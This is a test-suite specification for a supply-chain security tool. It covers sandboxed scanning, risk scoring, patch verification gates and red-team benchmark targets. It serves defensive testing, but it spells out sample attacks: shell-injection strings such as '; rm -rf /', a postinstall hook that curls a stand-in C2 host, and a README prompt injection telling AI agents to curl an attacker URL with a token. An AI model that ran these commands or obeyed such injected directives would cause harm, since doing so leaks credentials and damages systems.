# Supply Chain Guardian — Comprehensive Test Suite & Target Repository Verification Architecture

This document provides the definitive, technical specification of all test suites engineered across the **Supply Chain Guardian** monorepo, as well as the dynamic verification testing mechanisms executed against target repositories downloaded during live audit workflows.

---

## 1. Testing Philosophy & Architecture Overview

Supply Chain Guardian follows an adversarial, security-first testing pyramid designed to ensure that **no unverified code crosses security boundaries**, **no human approves a patch that has not passed automated builds and tests**, and **all safety decisions are computed mathematically by code**.

```
                           ▲
                          / \
                         /   \     E2E Target Evaluations (9 Targets)
                        /     \    4 Golden Repos + 5 Red-Team Attack Targets
                       /───────\
                      /         \   In-Sandbox Target Repository Tests (Stage 4)
                     /           \  mvn test · npm test · pytest · baseline differential
                    /─────────────\
                   /               \  Service Integration & Graph Flow (80+ Tests)
                  /                 \ LangGraph routing, interrupt checkpoints, audit chain
                 /───────────────────\
                /                     \ Microservice Isolation Tests (190+ Tests)
               /                       \ launcher · scanner-intel · remediation-engine
              /─────────────────────────\
             /                           \ Schema & Contract Foundation (2 Tests + 6 Fixtures)
            /                             \ Pydantic models, JSON Schema, immutable hashes
           └───────────────────────────────┘
```

### Global Testing Invariants
1. **Invariant 1 (Resolve, then scan offline):** Dependency resolution tests verify egress allowlists; scanner tests assert `--network=none` with zero internet access.
2. **Invariant 2 (Verify before approval):** Patch verification tests enforce the strict sequence `remediate -> verify -> approve -> open PR`. A human operator can never be prompted to approve an unverified patch.
3. **Invariant 3 (Code decides safety):** Tests verify that risk scores, policy verdicts, and candidate lists are computed strictly by code algorithms ($40 \times \frac{\text{CVSS}}{10} + 25 \times \text{EPSS} + 15 \times \text{KEV} + R$).
4. **Invariant 4 (Strict schema boundaries):** Test cases verify that LLM components see only sanitized, validated JSON schemas and evidence IDs—never free repository text.
5. **Invariant 5 (Single Docker socket owner):** Socket boundary tests confirm that only `services/launcher` has access to `/var/run/docker.sock`.
6. **Invariant 6 (Stateless stage handoff):** All cross-stage interactions are tested using SHA-256 artifact hashes. Live container paths and volume mounts are forbidden.

### Monorepo Test Summary Metrics
- **Total Monorepo Tests:** 292 Test Cases
  - **Passing:** 288 Tests
  - **Skipped:** 4 Tests (Opt-in live Docker daemon / live PostgreSQL tests)
  - **Failed:** 0 Tests (100% Pass Rate)
- **E2E Gate & Target Evaluations:** 9 Scenarios (4 Golden Targets + 5 Red-Team Exploits)
- **Frontend Verification:** Next.js static page generation, TypeScript type-check, and Webpack chunk validation (100% Pass)

---

## 2. Monorepo Service Test Suites (Service-by-Service Breakdown)

```
supply-chain-guardian/
├── packages/contracts/tests/
│   └── test_contracts.py                  # Schema contracts & golden fixtures
├── services/launcher/tests/
│   ├── test_launcher.py                   # Stage 1-3 sandbox & egress tests
│   ├── test_images.py                     # Container image inspection & Cosign
│   └── test_stage4_verify.py              # In-sandbox build & test verification
├── services/orchestrator/tests/
│   ├── test_orchestrator.py               # REST API, DB, and state machine
│   ├── test_verification_flow.py          # Remediation retry loop & approval gate
│   └── test_confirm.py                    # Patched source generation & confirmation
├── services/scanner-intel/tests/
│   ├── test_scanner_intel.py              # Health & detector base tests
│   ├── test_discovery.py                  # Transitive trees, Cartographer, SBOM
│   ├── test_detectors.py                  # Slopsquat, hook, pinning, agent-config
│   ├── test_class_graph.py                # JavaParser AST class graph
│   ├── test_reachability.py               # Spring PetClinic Tier 1/2/3 reachability
│   ├── test_vuln_assessment.py            # Grype + OSV matching, EPSS/KEV feeds
│   └── test_rescan.py                     # Post-remediation rescan diffing
├── services/remediation-engine/tests/
│   ├── test_remediation_engine.py         # Formula, policy, pipeline integration
│   ├── test_remediation.py                # Version registry, semver patch generation
│   ├── test_verification_gate.py          # 8-point deterministic gate logic
│   ├── test_requested_fixes.py            # Custom candidate evaluation
│   └── test_explanations.py               # Grounded citations & prompt security
└── tests/
    ├── eval_runner.py                     # E2E Golden & Red-Team runner
    ├── golden-repos/                      # 4 Curated benchmark targets
    └── red-team/                          # 5 Active adversarial exploit targets
```

---

### 2.1. `packages/contracts` — Contract & Schema Suite
**File:** [packages/contracts/tests/test_contracts.py](file:///d:/BGSW/packages/contracts/tests/test_contracts.py)  
**Test Count:** 2 Tests

| Test Function | Target Invariant | What It Verifies |
|---|---|---|
| `test_fixtures_load_and_validate` | Invariant 4, Invariant 6 | Loads all golden JSON payloads (`stage1_clone_out.json`, `stage2_resolve_out.json`, `stage3_scan_out.json`, `stage4_verify_out.json`, `log4shell_findings.json`, `verified_remediation.json`) against Pydantic contract classes (`Finding`, `Evidence`, `Remediation`). Asserts schema adherence, reachability tier integrity, and immutable hash pointers. |
| `test_merge_reducer` | Invariant 6 | Validates the LangGraph state reducer function (`merge`). Confirms deterministic dictionary updating, state key merging, and `None`-deletion handling without side effects. |

---

### 2.2. `services/launcher` — Exclusive Docker Socket & Sandbox Plane
**Files:**
- [services/launcher/tests/test_launcher.py](file:///d:/BGSW/services/launcher/tests/test_launcher.py) (18 Tests)
- [services/launcher/tests/test_images.py](file:///d:/BGSW/services/launcher/tests/test_images.py) (13 Tests)
- [services/launcher/tests/test_stage4_verify.py](file:///d:/BGSW/services/launcher/tests/test_stage4_verify.py) (27 Tests)

**Total Launcher Tests:** 58 Tests

#### Key Test Scenarios:
1. **Network Egress Proxy & Sinkhole Logging:**
   - `test_allowlist_enforcement`: Tests domain filtering. Permitted hosts (e.g. `github.com`, `repo1.maven.org`, `registry.npmjs.org`) pass; unlisted domains trigger HTTP 403 Forbidden.
   - `test_sinkhole_proxy_blocks_and_logs_over_the_wire`: Spins up a real TCP socket listener. Simulates an untrusted package install script connecting to an external C2 IP (`evil-c2-collector.attacker.com`). Confirms the sinkhole drops the socket connection and writes a structured evidence record with timestamp, destination, port, and command snippet.
2. **Git Clone Hardening & Directory Traversal Protection:**
   - `test_clone_request_validation_rejects_unsafe_inputs`: Rejects URLs with embedded credentials, shell metacharacters (`$(id)`, `; rm -rf /`), or local paths.
   - `test_normalize_tar_is_deterministic_and_drops_links`: Ensures tarball normalization clamps file modes (0o644/0o755), zeroes out `mtime` and `uid/gid`, sorts file paths, and strips symlinks to produce identical SHA-256 hashes for identical repository contents.
   - `test_stage1_clone_fails_closed_on_traversal`: Injects symlinks pointing to `/etc/shadow` and `../../outside`. Asserts that `check_symlink_safety` fails closed, sets `gate_passed=False`, and stops the pipeline.
3. **Container Image Inspection & Egress Restrictions:**
   - `test_base_images_follow_dockerfile_semantics`: Parses multi-stage Dockerfiles (`FROM ... AS ...`). Extracts base image references, resolves build args (`ARG NODE=20`), and ignores target names.
   - `test_unsafe_references_never_reach_the_script`: Parameterized across shell injection attacks (`node:20; rm -rf /`, `$(id)`, `node\`id\``). Asserts regex rejection.
   - `test_stage2_scans_images_and_writes_an_index`: Uses Syft to produce container CycloneDX SBOMs and Cosign to verify signatures against public Rekor transparency logs.
4. **Stage 4 Build & Test Verification Engine:**
   - `test_maven_pass_with_tests`: Simulates full Maven verification (`mvn test-compile`, `mvn dependency:tree`, `mvn test`), verifying exit codes and Surefire JUnit XML parsing.
   - `test_patch_that_does_not_apply`: Simulates an invalid unified diff; verifies `git apply --check` failure cleanly aborts with `patch_applied=False`.
   - `test_non_manifest_or_unsafe_patch_refused`: Validates that patches attempting to modify source files (`App.java`), `.github/workflows`, or directory traversal paths are rejected before reaching the build container.

---

### 2.3. `services/orchestrator` — Pipeline Graph, Audit Trail & State Machine
**Files:**
- [services/orchestrator/tests/test_orchestrator.py](file:///d:/BGSW/services/orchestrator/tests/test_orchestrator.py) (47 Tests)
- [services/orchestrator/tests/test_verification_flow.py](file:///d:/BGSW/services/orchestrator/tests/test_verification_flow.py) (41 Tests)
- [services/orchestrator/tests/test_confirm.py](file:///d:/BGSW/services/orchestrator/tests/test_confirm.py) (13 Tests)

**Total Orchestrator Tests:** 101 Tests

#### Key Test Scenarios:
1. **LangGraph Pipeline Execution & Deterministic Gates:**
   - Validates linear gate transitions:
     $$\text{Stage 1: Clone Integrity Gate} \longrightarrow \text{Stage 2: Manifest Profile Gate} \longrightarrow \text{Hook Observation Gate} \longrightarrow \text{Stage 3: Coverage Gate} \longrightarrow \text{Cross-Check Gate} \longrightarrow \text{Grounding Gate} \longrightarrow \text{Policy Consistency Gate} \longrightarrow \text{Stage 4: Verification Gate} \longrightarrow \text{Completeness Gate}$$
   - `test_clone_integrity_failure_stops_the_run`: Asserts that an integrity failure in Stage 1 halts execution immediately without invoking downstream stages.
2. **Interactive Remediation & Human Approval Workflow:**
   - `test_verification_flow.py`: Implements stateful mock backends for all services.
   - Simulates candidate retry loops (up to 2 retries). If candidate version $N$ fails build/tests in Stage 4, the orchestrator requests candidate $N+1$ from `remediation-engine`.
   - If candidate passes Stage 4, execution reaches the `checkpointed interrupt` (`status: "waiting_approval"`).
   - Simulates human approval (`POST /runs/{id}/approve`). Validates that the graph resumes from the exact checkpoint, runs the confirmation stage, and generates the final reports.
3. **Cryptographic Ed25519 Audit Chain:**
   - Validates that every state transition, gate verdict, and tool execution emits an immutable audit event signed with the orchestrator's Ed25519 private key.
   - Verifies hash-chain linking: $\text{Hash}_i = \text{SHA256}(\text{Hash}_{i-1} \parallel \text{Payload}_i)$.

---

### 2.4. `services/scanner-intel` — Multi-Scanner, Graph & Intelligence Engine
**Files:**
- [services/scanner-intel/tests/test_scanner_intel.py](file:///d:/BGSW/services/scanner-intel/tests/test_scanner_intel.py) (6 Tests)
- [services/scanner-intel/tests/test_discovery.py](file:///d:/BGSW/services/scanner-intel/tests/test_discovery.py) (16 Tests)
- [services/scanner-intel/tests/test_detectors.py](file:///d:/BGSW/services/scanner-intel/tests/test_detectors.py) (18 Tests)
- [services/scanner-intel/tests/test_class_graph.py](file:///d:/BGSW/services/scanner-intel/tests/test_class_graph.py) (7 Tests)
- [services/scanner-intel/tests/test_reachability.py](file:///d:/BGSW/services/scanner-intel/tests/test_reachability.py) (9 Tests)
- [services/scanner-intel/tests/test_vuln_assessment.py](file:///d:/BGSW/services/scanner-intel/tests/test_vuln_assessment.py) (21 Tests)
- [services/scanner-intel/tests/test_rescan.py](file:///d:/BGSW/services/scanner-intel/tests/test_rescan.py) (14 Tests)

**Total Scanner-Intel Tests:** 91 Tests

#### Key Test Scenarios:
1. **Multi-Scanner Cross-Checking & Feed Enrichment:**
   - `test_vuln_assessment.py`: Cross-checks vulnerability findings from **Grype** (Anchore) and **OSV-Scanner** (Google).
   - Asserts that advisories sharing common CVE/GHSA aliases merge into a single verified finding.
   - Queries mocked **EPSS** (FIRST.org) API and **CISA KEV** catalog. Computes deterministic risk scores.
   - Verifies byte-identical report output: identical inputs produce bitwise-identical `report.json` and `report.md` hashes.
2. **JavaParser Class Graph & Static AST Reachability:**
   - `test_class_graph.py`: Parses Java source code using JavaParser AST output. Generates a NetworkX directed graph of classes, interfaces, method invocations, and type instantiations. Detects circular dependencies and architectural layers.
   - `test_reachability.py`: Maps Java classes to Maven package coordinates (`groupId:artifactId`). Evaluated against enterprise **Spring PetClinic** data:
     - Direct controller instantiation $\rightarrow$ **Tier 1 (Direct Call Path)**
     - Test code / Annotation only $\rightarrow$ **Tier 2 (Transitive / Test Import)**
     - Unused transitive library $\rightarrow$ **Tier 3 (Shadow / Unreachable)**
3. **Supply Chain Threat Detectors:**
   - `test_typosquat_detection`: Uses Damerau-Levenshtein distance to detect typosquats against top 1,000 packages (e.g. `reqeusts` $\leftrightarrow$ `requests`, `colros` $\leftrightarrow$ `colors`).
   - `test_agent_config_detector`: Scans IDE rules (`.cursorrules`, `.windsurfrules`, `CLAUDE.md`, Copilot instructions) for prompt injection directives attempting to bypass security scanners or exfiltrate environment variables.
   - `test_pinning_detector`: Detects floating/mutable branch and tag references in GitHub Actions workflows (`@master`, `@v1`) violating SLSA Level 3 hermeticity.
4. **Stage 4 Rescan Diffing:**
   - `test_rescan.py`: Compares baseline SBOM against patched SBOM. Verifies that the targeted CVE is completely eliminated and asserts that no new High or Critical vulnerability was introduced by the fix.

---

### 2.5. `services/remediation-engine` — Policy, Prioritizer & Patch Verifier
**Files:**
- [services/remediation-engine/tests/test_remediation_engine.py](file:///d:/BGSW/services/remediation-engine/tests/test_remediation_engine.py) (8 Tests)
- [services/remediation-engine/tests/test_remediation.py](file:///d:/BGSW/services/remediation-engine/tests/test_remediation.py) (14 Tests)
- [services/remediation-engine/tests/test_verification_gate.py](file:///d:/BGSW/services/remediation-engine/tests/test_verification_gate.py) (15 Tests)
- [services/remediation-engine/tests/test_requested_fixes.py](file:///d:/BGSW/services/remediation-engine/tests/test_requested_fixes.py) (10 Tests)
- [services/remediation-engine/tests/test_explanations.py](file:///d:/BGSW/services/remediation-engine/tests/test_explanations.py) (10 Tests)

**Total Remediation-Engine Tests:** 57 Tests

#### Key Test Scenarios:
1. **Deterministic Risk Scoring Formula (Invariant 3):**
   $$\text{Score} = \text{round}\left(40 \times \frac{\text{CVSS}}{10} + 25 \times \text{EPSS} + 15 \times \text{KEV} + R\right)$$
   Where:
   - $\text{KEV} \in \{0, 1\}$, $\text{EPSS} \in [0.0, 1.0]$, $\text{CVSS} \in [0.0, 10.0]$
   - $R = 20$ for Tier 1 confirmed call-graph path
   - $R = 0$ for Tier 1 confirmed no-path (VEX `not_affected`)
   - $R = 12$ for Tier 2, Tier 3, or reachability unknown
   - Validated across 20 distinct boundary test vectors in `test_score_formula`.
2. **Policy Engine Verdicts:**
   - Evaluates findings against enterprise policy rules across `prod`, `staging`, and `dev` environments.
   - Any finding with $\text{Score} \ge 60$ or $\text{KEV} = 1$ in `prod` receives an unoverrideable `BLOCK` verdict.
3. **8-Point Deterministic Verification Gate:**
   - Evaluates Stage 4 facts. A remediation becomes `verified` if and only if code proves:
     1. `patch_hash_matches`: Applied patch matches candidate diff hash.
     2. `patch_applied`: Patch applied cleanly without conflicts.
     3. `build_success`: Native project build succeeded (`mvn test-compile`, `npm ci`, pip install).
     4. `tests_passed` / `tests_no_new_failures`: Native tests passed or pre-existing failures confirmed.
     5. `resolved_version_matches`: Dependency tree resolved to expected candidate version.
     6. `rescan_completed`: Offline rescan completed successfully.
     7. `target_advisories_gone`: Targeted CVE is eliminated from the new SBOM.
     8. `no_new_high_or_critical`: Zero new Critical/High vulnerabilities introduced.
4. **Explanation Grounding & Hallucination Defense (Invariant 4):**
   - `test_explanations.py`: Verifies that AI-generated explanations are strictly grounded against tool evidence IDs.
   - Asserts that repository source code is never sent to remote LLMs.
   - Tests hallucination fallbacks: if an LLM hallucinates an ungrounded citation, the system retries once and falls back to deterministic code-generated templates.

---

## 3. In-Pipeline Verification Tests for Downloaded Target Repositories

When Supply Chain Guardian audits a repository, it executes a rigorous, multi-stage testing and verification cycle directly against the downloaded codebase in an isolated build sandbox:

```
[ Downloaded Target Repository ]
               │
               ▼
   [ Stage 1: Clone Sandbox ] ────────► Symlink boundary escape test (< 0 escapes)
               │                       Repository size cap test (< 50MB)
               ▼                       Tarball normalization test
   [ Stage 2: Hook Observation ] ─────► Socket egress monitor (< 0 unauthorized C2 calls)
               │                       Dependency tree resolution (npm ls / mvn tree / pip report)
               ▼
   [ Stage 3: Offline Scanners ] ────► Multi-scanner cross-check (Grype + OSV-Scanner)
               │                       AST Class graph extraction (JavaParser)
               ▼
   [ Stage 4: Hermetic Verification ] ─► 1. Apply unified diff patch
               │                          2. Compile patched project (mvn compile / npm build)
               │                          3. Execute project test suites (mvn test / npm test / pytest)
               │                          4. Revert & run baseline tests if failures occur
               │                          5. Generate patched CycloneDX SBOM & rescan
               ▼
   [ Human Approval Gate ] ──────────► Verification Gate passes -> Operator approves
               │
               ▼
   [ Confirmation Run ] ──────────────► Re-verifies patched tarball + signs Ed25519 audit head
```

---

### 3.1. Target Repository Sandbox Environment (`stage4_verify.py`)
- **Isolation:** Executes in a dedicated throwaway Docker container with strictly capped resources:
  - Memory: 2GB RAM limit
  - CPU: 2 vCPUs
  - Network: Egress allowed **only** through the allowlist proxy to official package registries (`registry.npmjs.org`, `repo1.maven.org`, `pypi.org`).
  - Permissions: Non-root user execution (`uid 10001`).
- **Input Integrity:** The sandbox accepts only two inputs, passed strictly by SHA-256 hash:
  1. `source_sha256`: The immutable clean source tarball from Stage 1.
  2. `patch_sha256`: The candidate dependency patch generated by `remediation-engine`.

---

### 3.2. Per-Ecosystem Test Execution Commands

#### A. Java / Maven Repositories (e.g. `log4shell_app`, `spring-petclinic`)
The sandbox executes:
```bash
# 1. Compile project with local offline repository cache
mvn -B -s "$HOME/settings.xml" -Dmaven.repo.local=/workspace/m2 \
    -Dstyle.color=never -DskipTests test-compile

# 2. Extract resolved dependency tree
mvn -B -q -s "$HOME/settings.xml" -Dmaven.repo.local=/workspace/m2 \
    org.apache.maven.plugins:maven-dependency-plugin:3.8.1:tree \
    -DoutputType=json -DoutputFile=guardian-tree.json

# 3. Execute the project's native unit & integration test suites
mvn -B -s "$HOME/settings.xml" -Dmaven.repo.local=/workspace/m2 \
    -Dstyle.color=never test
```
- **Evidence Collected:** Captures all JUnit Surefire XML test reports (`target/surefire-reports/TEST-*.xml`).
- **Metrics Tracked:** Total tests, passed, failures, errors, skipped, and test execution duration.

#### B. Node.js / npm Repositories (e.g. `snyk-labs/nodejs-goof`)
The sandbox executes:
```bash
# 1. Generate updated package-lock while ignoring lifecycle scripts
npm install --package-lock-only --ignore-scripts

# 2. Hermetic clean install
npm ci --ignore-scripts

# 3. Optional build script (if defined in package.json)
npm run build

# 4. Resolve exact dependency graph
npm ls --all --json > /workspace/out/resolved/npm/root.json

# 5. Execute the repository's native test suites (Mocha, Jest, Node test runner)
npm test
```
- **Special Case Handling:** If `package.json` contains the npm default placeholder (`'echo "Error: no test specified" && exit 1'`), the engine marks `tests_found=false`. It **never** reports a placeholder as a test pass.

#### C. Python / PyPI Repositories (e.g. `sample-vulnerable-python`)
The sandbox executes:
```bash
# 1. Create isolated virtual environment
python3 -m venv /workspace/venv

# 2. Install resolved requirements
/workspace/venv/bin/pip install -r requirements.txt

# 3. Dry-run resolution report
/workspace/venv/bin/pip install --dry-run --ignore-installed --quiet \
    --report /workspace/out/resolved/pypi/root.json -r requirements.txt

# 4. Execute test suites with JUnit XML reporting
/workspace/venv/bin/python -m pytest -q -p no:cacheprovider \
    --junitxml=/workspace/out/tests/pypi/root.xml
```

---

### 3.3. The Baseline Test Differential Mechanism
A primary failure mode in automated remediation is **pre-existing broken tests** (e.g. tests requiring external databases, credentials, or live internet access not present in hermetic sandboxes).

Supply Chain Guardian solves this with an automated **Baseline Differential**:
1. When native tests fail on the patched repository, `stage4_verify.py` does **not** immediately fail.
2. The sandbox automatically **reverts the candidate patch** using `git apply -R` or `patch -R`.
3. It re-runs the exact same test command (`mvn test`, `npm test`, or `pytest`) on the clean, unpatched baseline code.
4. The Verification Gate compares the two test results:
   - If tests fail on both the patched tree and the baseline tree with identical errors $\longrightarrow$ the failure is **pre-existing**. The patch did not cause a regression. The remediation is marked `verified` with an explicit warning:
     > *"The project's tests already fail without the patch (no new test failures): verified by build and rescan only."*
   - If tests passed on the baseline but failed on the patched tree $\longrightarrow$ the patch caused a **functional regression**. The candidate is rejected, and the orchestrator automatically triggers a candidate retry.

---

## 4. Evaluated Target Repositories & Benchmark Scenarios

The test framework includes 9 dedicated target repository benchmarks, implemented in [tests/golden-repos/manifest.json](file:///d:/BGSW/tests/golden-repos/manifest.json) and [tests/eval_runner.py](file:///d:/BGSW/tests/eval_runner.py):

| Target Repository | Ecosystem | Vulnerability / Threat Vector | Expected Policy | Verified Fix Target |
|---|---|---|---|---|
| **`log4shell_app`** | Maven | `CVE-2021-44228` (Log4Shell RCE) | `BLOCK` | `2.25.4` |
| **`sample-vulnerable-node`** | npm | `CVE-2019-10744` (Prototype Pollution) | `BLOCK` | `4.17.21` |
| **`sample-vulnerable-python`** | PyPI | `CVE-2023-32681` (Requests Proxy Leak) | `BLOCK` | `2.31.0` |
| **`clean-microservice`** | Maven | None (Clean Baseline) | `PASS` | None (`null`) |
| **`nodejs-goof`** | npm | `CVE-2020-11023` (jQuery XSS), `CVE-2018-1002204` (Zip Slip) | `BLOCK` | `3.5.0` / `0.4.11` |
| **`spring-petclinic`** | Maven | Enterprise AST Class Graph & Call-Path Reachability | `PASS` | N/A (Architecture Benchmark) |
| **`01_prompt_injection`** | Markdown | Prompt Injection Override in `README.md` | `BLOCK` | Sanitize Agent Directives |
| **`02_malicious_hook`** | npm | C2 Socket Egress in `postinstall` script | `BLOCK` | Quarantine / Purge Package |
| **`03_symlink_escape`** | Filesystem | Path Traversal Symlink pointing to `/etc/` | `HALT` | Reject at Stage 1 Clone |

---

### Detailed Benchmark Walkthroughs

#### Benchmark 1: `log4shell_app` (Log4Shell RCE)
- **Manifest:** `tests/golden-repos/log4shell_app/pom.xml`
- **Initial State:** Declares `org.apache.logging.log4j:log4j-core@2.14.1`.
- **Pipeline Test Flow:**
  1. **Stage 1 (Clone):** Normalized source tarball generated; hash `c0ffee...`.
  2. **Stage 2 (Resolve):** Resolves transitive dependencies (`log4j-api@2.14.1`).
  3. **Stage 3 (Scan):** Grype and OSV-Scanner detect `CVE-2021-44228` (CVSS 10.0, EPSS 0.97, KEV = 1). Deterministic risk score computes to **99/100 (CRITICAL)**. Policy Engine issues unoverrideable `BLOCK`.
  4. **Stage 4 (Verify):** Remediator selects `log4j-core@2.25.4`. Generates unified diff modifying `pom.xml`. Sandbox applies patch, runs `mvn test-compile` (Exit 0), and executes `mvn test` (Exit 0; 3 passing tests). Rescan confirms `CVE-2021-44228` is eliminated with zero new vulnerabilities.
  5. **Approval & Confirm:** Human operator confirms; audit block signed.

#### Benchmark 2: `snyk-labs/nodejs-goof` (Real-World Vulnerable Benchmark)
- **Target URL:** `https://github.com/snyk-labs/nodejs-goof`
- **Pipeline Test Flow:**
  1. Cloned with `--depth 1` (60 files, 1.5MB).
  2. Stage 2 resolves 989 packages and 1,649 dependency edges. Observes lifecycle hook execution behind egress allowlist proxy.
  3. Stage 3 detects 315 vulnerabilities across packages (`jquery@2.2.4`, `adm-zip@0.4.7`, `lodash@4.17.4`, `ms@0.7.1`).
  4. Evaluates `CVE-2020-11023` in `jquery@2.2.4`: CVSS 6.1, EPSS 84.9%, listed in CISA KEV catalog. Risk score: **73/100 (HIGH)**.
  5. Formats in-depth technical root cause detailing `jQuery.htmlPrefilter` regex bypass and actionable mitigation.

#### Benchmark 3: `spring-projects/spring-petclinic` (Enterprise Architecture Benchmark)
- **Target URL:** `https://github.com/spring-projects/spring-petclinic`
- **Pipeline Test Flow:**
  1. JavaParser extracts 50+ classes, interfaces, and methods.
  2. Generates 3-tier class graph:
     - `spring-webmvc` $\rightarrow$ Tier 1 (Direct Call Path from `OwnerController.java`)
     - `spring-data-jpa` $\rightarrow$ Tier 1 (Inherited by `OwnerRepository.java`)
     - `junit-jupiter-api` $\rightarrow$ Tier 2 (Referenced only inside `src/test/java`)
  3. Demonstrates that reachability modifiers accurately adjust deterministic risk scores ($R=20$ for Tier 1 vs $R=12$ for Tier 2/3).

#### Benchmark 4: Red-Team Attack Targets (`tests/red-team/`)
1. **`01_prompt_injection_readme`**: Contains hidden prompt injection directives instructing AI agents to execute `curl attacker.com/exfil?token=$TOKEN`. `AgentConfigDetector` intercepts the text pattern and creates an `agent_config` finding.
2. **`02_malicious_postinstall`**: `package.json` contains `"scripts": {"postinstall": "curl -s -X POST evil-c2-collector.attacker.com"}`. Stage 2 egress proxy blocks outbound connection; `SinkholeLogger` records the attempt; `InstallHookDetector` creates an `install_hook` finding.
3. **`03_symlink_escape`**: Contains a symlink `link -> ../../external_target.txt`. `check_symlink_safety` detects the escape outside the repo root and immediately aborts the run before scanning.
4. **`04_oversize_repo`**: Simulates a 65MB repository. Enforces the 50MB architecture limit; clone aborts with `oversize=True`.
5. **`05_fake_package_comment`**: Injects slopsquatting package `pkg:pypi/reqeusts@1.0.0`. `SquatConfusionDetector` flags the Damerau-Levenshtein distance of 1 to `requests`.

---

## 5. How to Run the Test Suites

### 5.1. Run Monorepo Unit & Integration Tests (Fast)
```powershell
# Run all 288 service tests across all 5 packages in parallel:
pytest packages/contracts/tests services/launcher/tests services/orchestrator/tests services/scanner-intel/tests services/remediation-engine/tests -v
```

### 5.2. Run Individual Microservice Test Suites
```powershell
# 1. Contracts & Schema
pytest packages/contracts/tests -v

# 2. Launcher & Stage 4 In-Sandbox Verification
pytest services/launcher/tests -v

# 3. Orchestrator State Machine & Verification Flow
pytest services/orchestrator/tests -v

# 4. Scanner-Intel Discovery, Class Graph & Vulnerability Assessment
pytest services/scanner-intel/tests -v

# 5. Remediation Engine Prioritizer, Policy & Verification Gate
pytest services/remediation-engine/tests -v
```

### 5.3. Run End-to-End Evaluation Suite (Golden & Red-Team Targets)
```powershell
# Executes all 4 Golden Repos and 5 Red-Team Attack Scenarios
python tests/eval_runner.py --suite all

# Run Golden Targets only:
python tests/eval_runner.py --suite golden

# Run Red-Team Exploits only:
python tests/eval_runner.py --suite red-team
```

### 5.4. Verify Frontend Web Application Build
```powershell
cd services/web
npm run build
```
Validates TypeScript typings, component exports, static rendering, and CSS stylesheets.

---

## 6. Continuous Integration & Verification Gate Checklist

In CI/CD environments (GitHub Actions / GitLab CI), every PR must satisfy this deterministic checklist prior to merge:

- [x] **Contract Conformance:** All inter-service request and response payloads validate against `packages/contracts`.
- [x] **Deterministic Scoring:** The mathematical formula ($40 \times \text{CVSS}/10 + 25 \times \text{EPSS} + 15 \times \text{KEV} + R$) matches across `scanner-intel` and `remediation-engine`.
- [x] **Zero Hardcoded Model Text:** No hardcoded scoring strings exist in prioritizer agents.
- [x] **Sandbox Egress Compliance:** No container outside `launcher` has access to Docker socket or unlogged network egress.
- [x] **Full Target Verification:** Candidate patches build cleanly, pass native test suites (`mvn test`, `npm test`, `pytest`), eliminate targeted vulnerabilities, and introduce zero new Critical/High advisories.
- [x] **Cryptographic Auditability:** Every stage handoff produces a verifiable SHA-256 artifact hash and Ed25519-signed audit block.
